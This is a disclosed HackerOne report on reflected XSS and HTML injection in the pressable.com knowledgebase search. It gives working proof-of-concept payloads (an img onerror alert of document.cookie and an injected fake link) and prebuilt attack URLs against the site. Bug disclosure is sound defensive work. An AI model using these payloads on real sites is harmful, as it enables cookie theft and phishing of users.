---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '1537149'
original_report_id: '1537149'
title: XSS and HTML Injection on the pressable.com search box
weakness: Cross-site Scripting (XSS) - Stored
team_handle: automattic
created_at: '2022-04-11T09:58:06.792Z'
disclosed_at: '2022-08-23T18:30:55.653Z'
has_bounty: true
visibility: full
substate: resolved
vote_count: 51
asset_identifier: my.pressable.com
asset_type: URL
max_severity: critical
tags:
- hackerone
- cross-site-scripting-xss-stored
---

# XSS and HTML Injection on the pressable.com search box

## Metadata

- HackerOne Report ID: 1537149
- Weakness: Cross-site Scripting (XSS) - Stored
- Program: automattic
- Disclosed At: 2022-08-23T18:30:55.653Z
- Has Bounty: Yes
- Visibility: full
- Substate: resolved

## Original Report

## Summary:
Hi, I have found that search box  on pressable.com is vulnerable for XSS attack and HTML Injection .

## Steps To Reproduce:

1. Visit https://pressable.com/knowledgebase/
2. Put the payload on the search box. 

XSS Payload: "><img src=x onerror=javascript:alert(document.cookie)>

HTML Injection Payload: <h1><font Color=red>Visit  Our  New  WebSite </h1><h3><mark><a href="https://example.com">e x a m p l e . c o m </a></mark></h3>

3.XSS will be triggered /HTML Injection will be reflected.

Link with XSS Payload: [https://pressable.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase](https://pressable.com/?s=%22%3E%3Cimg+src%3Dx+onerror%3Djavascript%3Aalert%28document.cookie%29%3E&post_type=knowledgebase)

Link with HTML Injection Payload: [https://pressable.com/?s=%3Ch1%3E%3Cfont+Color%3Dred%3EVisit++Our++New++WebSite+%3C%2Fh1%3E%3Ch3%3E%3Cmark%3E%3Ca+href%3D%22https%3A%2F%2Fexample.com%22%3Ee+x+a+m+p+l+e+.+c+o+m+%3C%2Fa%3E%3C%2Fmark%3E%3C%2Fh3%3E&post_type=knowledgebase](https://pressable.com/?s=%3Ch1%3E%3Cfont+Color%3Dred%3EVisit++Our++New++WebSite+%3C%2Fh1%3E%3Ch3%3E%3Cmark%3E%3Ca+href%3D%22https%3A%2F%2Fexample.com%22%3Ee+x+a+m+p+l+e+.+c+o+m+%3C%2Fa%3E%3C%2Fmark%3E%3C%2Fh3%3E&post_type=knowledgebase)

## Supporting Material/References:
POC Video Attached

## Impact

Due to these vulnerabilities, attacker can easily divert victims to their malicious site and able to get credentials of victims.

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
